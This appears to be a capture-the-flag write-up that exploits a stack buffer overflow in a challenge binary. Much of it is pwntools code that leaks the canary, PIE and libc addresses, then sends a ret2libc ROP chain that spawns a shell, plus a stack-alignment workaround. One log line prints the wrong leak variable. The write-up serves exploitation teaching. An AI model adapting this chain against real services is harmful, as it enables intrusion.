Plin Plin Plon

March 30, 2026

Introduction

In this challenge we are provided with:

  • The binary vuln
  • A glibc libc.so.6
  • A loader ld-linux-x86-64.so.2

The program lets the user input a string of up to 0x80 bytes in a loop, and the program prints it with puts. There are two important notes here:

  • The string is read with read, so it doesn’t append a \x00 at the end. This will be important for leaking.
  • read reads 0x80 bytes but the buffer is 88 bytes (0x58 in hex). THERE IS A BUFFER OVERFLOW HERE!

The exploitation strategy will be:

  1. Leak the Canary, PIE and LIBC with read.
  2. Overwrite the Canary with the leak.
  3. Overwrite the Saved return address with our ROP Chain.
  4. Write “plin plin plon” to exit the loop and reach the return.

Phase 1: Leak

Before starting we need to know the offsets from the input to the Canary and the Saved ret. This can be easily determined with Ghidra:

  • The distance from input to the Saved ret is 0x68 bytes
  • The distance from input to the Canary is 0x58 bytes

from pwn import *

binary = "./vuln"
elf = context.binary = ELF(binary, checksec=False)
libc = elf.libc

p = process(binary)

offset_to_canary = 0x58
offset_to_ret = 0x68

# Canary leak
payload = b"A"*(offset_to_canary+1) # Offset to canary+1 to overwrite the canary's nullbyte
p.send(payload)
p.recv(offset_to_canary+1)
canary = u64(p.recv(7).rjust(8, b"\x00"))
log.info("CANARY --> "+hex(canary))

# PIE leak
payload = b"A"*offset_to_ret
p.send(payload)
p.recvline()
p.recv(offset_to_ret)
pie_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK PIE --> "+hex(pie_leak))

# LIBC leak
payload = b"A"*(offset_to_ret+0x10)
p.send(payload)
p.recvline()
p.recv(offset_to_ret+0x10)
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK LIBC --> "+hex(pie_leak))

Now we need to go from the PIE and Libc leaks to their respective bases. This is trivial — just connect the binary to gdb after the leaks to get the bases, then calculate the offsets.

Phase 2: ROPChain

Let’s build the typical ret2libc ROPChain: –> POP RDI; RET; /bin/sh ; system

We can calculate the offsets manually or use pwntools — I’ll go with the latter.

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh\x00"))

payload = b"A"*offset_to_canary + p64(canary) + b"B"*0x8 + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)
p.send(b"plin plin plon\x00")
p.interactive()

We run it and… IT FAILS! This is because the stack is not aligned to mod 16, which is a requirement for calling system, and we don’t have space to add more gadgets. To fix this we have two options: use a One Gadget, or align the stack using plin’s return. I’ll go with the second option.

Phase 3: Stack Alignment

The idea here is simple — we’ll do two payloads:

  1. The first will overwrite the Saved return address with plin, so that when exiting it aligns the stack and returns to the vulnerable function.
  2. With the stack aligned we’ll execute the previous payload with our ROP Chain, which will work now that the stack is aligned.

Here we have the plin function. The idea is that in the first stage the final return calls plin again, aligning the stack for the next stage.
